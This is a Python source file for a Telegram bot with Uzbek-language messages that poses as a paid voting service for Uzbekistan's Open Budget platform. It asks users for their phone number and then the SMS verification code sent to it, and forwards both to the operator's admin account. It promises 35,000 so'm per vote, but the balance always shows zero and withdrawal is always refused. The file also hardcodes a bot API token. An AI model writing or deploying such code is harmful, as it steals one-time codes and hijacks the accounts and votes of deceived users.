import asyncio
import os
import re
import sqlite3
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiohttp import web

API_TOKEN = "8996873868:AAEzelHwTo9H7IS8q46_b4rCe76Yuj-cMdo"
ADMIN_ID = 123456789  # SHU YERGA TELEGRAM ID'INGIZNI YOZING

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# --- BAZA SOZLAMALARI ---
conn = sqlite3.connect("bot_database.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS phone_numbers (
    phone TEXT PRIMARY KEY,
    user_id INTEGER
)
""")
cursor.execute("""
CREATE TABLE IF NOT EXISTS settings (
    key TEXT PRIMARY KEY,
    value TEXT
)
""")
conn.commit()

# Boshlang'ich loyiha ssilkasi (Faqat siz/admin ko'radi va biladi)
cursor.execute("INSERT OR IGNORE INTO settings VALUES ('target_link', 'https://openbudget.uz')")
conn.commit()

def get_target_link():
    cursor.execute("SELECT value FROM settings WHERE key='target_link'")
    res = cursor.fetchone()
    return res[0] if res else "https://openbudget.uz"

def set_target_link(link):
    cursor.execute("INSERT OR REPLACE INTO settings VALUES ('target_link', ?)", (link,))
    conn.commit()

def is_phone_used(phone):
    cursor.execute("SELECT phone FROM phone_numbers WHERE phone=?", (phone,))
    return cursor.fetchone() is not None

def save_phone(phone, user_id):
    cursor.execute("INSERT OR IGNORE INTO phone_numbers VALUES (?, ?)", (phone, user_id))
    conn.commit()

# --- FSM (HOLATLAR) ---
class BotStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_otziv = State()

def main_menu():
    builder = ReplyKeyboardBuilder()
    builder.button(text="📦 Ovoz berish")
    builder.button(text="💰 Balans")
    builder.button(text="📥 Pulni yechib olish")
    builder.button(text="🎉 Aksiyalar")
    builder.button(text="🐝 To'lovlar isboti")
    builder.button(text="💬 Admin bilan aloqa")
    builder.adjust(1, 2, 2, 1)
    return builder.as_markup(resize_keyboard=True)

@dp.message(Command("start"))
async def start_cmd(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer(
        "⚡️ **Open Budget Angren botiga xush kelibsiz!**\n\n"
        "✈️ **NARX YANA OSHIRILDI: 35.000 SO'M**\n"
        "💸 FOYDALANIB QOLINGLAR\n"
        "🔥 2-KUN VAQTINGIZ QOLDI 🔥\n\n"
        "Ovoz berish uchun quyidagi menyudan foydalaning:",
        reply_markup=main_menu(),
        parse_mode="Markdown"
    )

# Admin uchun loyiha ssilkasi o'zgartirish buyrug'i
@dp.message(Command("link"))
async def change_link(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        args = message.text.split(maxsplit=1)
        if len(args) > 1:
            set_target_link(args[1])
            await message.answer(f"✅ Joriy loyiha havolasi saqlandi:\n`{args[1]}`", parse_mode="Markdown")
        else:
            await message.answer(f"📌 Hozirgi loyiha ssilkasi:\n`{get_target_link()}`\n\nO'zgartirish uchun: `/link https://openbudget.uz/...`", parse_mode="Markdown")
    else:
        await message.answer("Siz admin emassiz!")

# 📦 Ovoz berish
@dp.message(F.text == "📦 Ovoz berish")
async def ovoz_berish(message: types.Message, state: FSMContext):
    builder_reply = ReplyKeyboardBuilder()
    builder_reply.button(text="📱 Telefon raqamni yuborish", request_contact=True)
    
    await message.answer(
        "📞 **Ovoz berish uchun telefon raqamingizni kiriting:**\n\n"
        "Telefon raqami **+998991234567** yoki **991234567** formatida kiritilishi kerak yoki pastdagi tugmani bosing:",
        reply_markup=builder_reply.as_markup(resize_keyboard=True),
        parse_mode="Markdown"
    )
    await state.set_state(BotStates.waiting_for_phone)

# Raqamni tekshirish
async def process_phone_entry(message: types.Message, raw_phone: str, state: FSMContext):
    clean_phone = re.sub(r'\D', '', raw_phone)
    if clean_phone.startswith("8"):
        clean_phone = "998" + clean_phone[1:]
    elif not clean_phone.startswith("998") and len(clean_phone) == 9:
        clean_phone = "998" + clean_phone

    if len(clean_phone) != 12:
        await message.answer("❌ Noto'g'ri telefon raqam formati. Qaytadan kiriting (Masalan: 991234567):")
        return

    if is_phone_used(clean_phone):
        await message.answer("Oldin bu raqamdan ovoz berilgan va qabul qilingan!", reply_markup=main_menu())
        await state.clear()
        return

    save_phone(clean_phone, message.from_user.id)
    user = message.from_user
    
    # Adminga loyiha ssilkasi bilan birga boradi
    await bot.send_message(
        ADMIN_ID,
        f"📥 **Yangi raqam keldi:**\n"
        f"User: @{user.username} ({user.full_name})\n"
        f"Tel: `+{clean_phone}`\n"
        f"Loyiha: {get_target_link()}",
        parse_mode="Markdown"
    )

    await message.answer(
        "✅ Raqamingiz qabul qilindi!\n\n"
        "Telefoningizga SMS kod yuborildi. **SMS KODNI** shu yerga yozib yuboring:",
        reply_markup=main_menu()
    )
    await state.set_state(BotStates.waiting_for_code)

@dp.message(F.contact, BotStates.waiting_for_phone)
async def get_contact_phone(message: types.Message, state: FSMContext):
    await process_phone_entry(message, message.contact.phone_number, state)

@dp.message(BotStates.waiting_for_phone)
async def get_text_phone(message: types.Message, state: FSMContext):
    await process_phone_entry(message, message.text, state)

# SMS Kodni qabul qilish
@dp.message(BotStates.waiting_for_code)
async def get_sms_code(message: types.Message, state: FSMContext):
    user = message.from_user
    code = message.text

    await bot.send_message(
        ADMIN_ID,
        f"🔑 **SMS KOD keldi:**\nUser: @{user.username}\nKod: `{code}`",
        parse_mode="Markdown"
    )

    await message.answer("✅ Kod adminga yetkazildi. Rahmat! Ovoz tasdiqlangach balansingizga pul o'tkaziladi.", reply_markup=main_menu())
    await state.clear()

# 💰 Balans
@dp.message(F.text == "💰 Balans")
async def check_balance(message: types.Message):
    await message.answer("💳 **Sizning balansingiz:** 0 so'm", parse_mode="Markdown")

# 📥 Pulni yechib olish
@dp.message(F.text == "📥 Pulni yechib olish")
async def withdraw_money(message: types.Message):
    await message.answer("❌ Minimal pul yechish summasi 35.000 so'm. Balansingiz yetarli emas.")

# 🎉 Aksiyalar
@dp.message(F.text == "🎉 Aksiyalar")
async def show_promotions(message: types.Message):
    await message.answer("🎁 **BONUSLAR VA AKSIYALAR O'Z JOYIDA!**\n\nHar bir ovoz uchun 35.000 so'm to'lanadi!", parse_mode="Markdown")

# 🐝 To'lovlar isboti
@dp.message(F.text == "🐝 To'lovlar isboti")
async def payment_proofs(message: types.Message):
    await message.answer("✅ To'lovlar isboti rasmiy kanalimizda: t.me/merik_bujet")

# 💬 Admin bilan aloqa
@dp.message(F.text == "💬 Admin bilan aloqa")
async def contact_admin(message: types.Message, state: FSMContext):
    await message.answer("Savolingizni yozib yuboring:")
    await state.set_state(BotStates.waiting_for_otziv)

@dp.message(BotStates.waiting_for_otziv)
async def receive_otziv(message: types.Message, state: FSMContext):
    user = message.from_user
    await message.answer("Murojaatingiz adminga yetkazildi!", reply_markup=main_menu())
    await state.clear()
    await bot.send_message(ADMIN_ID, f"💬 **Murojaat:** @{user.username}\n{message.text}")

# Render serveri
async def handle(request):
    return web.Response(text="Bot Live!")

async def main():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
